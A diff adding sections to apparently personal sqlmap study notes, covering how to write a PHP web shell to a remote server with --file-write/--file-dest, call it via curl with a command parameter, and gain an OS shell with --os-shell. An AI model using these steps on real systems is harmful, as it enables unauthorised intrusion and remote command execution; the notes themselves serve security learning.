@@ -834,5 +834,25 @@ writing files is typically disabled but some web apps still require it so it is 
 
 we can use `--file-write` and `--file-dest` to write to files
 
-first we can create a basic php web shell: 
+first we can create a basic php web shell and save it to file `shell.php` then try to write it to the remote server: 
+
+`sqlmap -u ... --file-write "shell.php" --file-dest "/var/www/html/shell.php"`
+
+then we can attempt to access the remote shell with curl: 
+
+`curl http://www.example.com/shell.php?cmd=ls+-la`
+
+### OS command execution 
+
+we can also use sqlmap to give us an OS shell without manually writing it   
+sqlmap will attempt to get a remote shell by writing one, using SQL functions that execute commands and get output, or use SQL queries that directly execute OS commands like `xp_cmdshell` 
+
+to get an OS shell you can use `--os-shell`: 
+
+`sqlmap -u ... --os-shell`
+
+you can also combine this with `--technique` to specify types of OS shell methods to try to get better results: 
+
+`sqlmap -u ... --os-shell --technique=E`
+
 
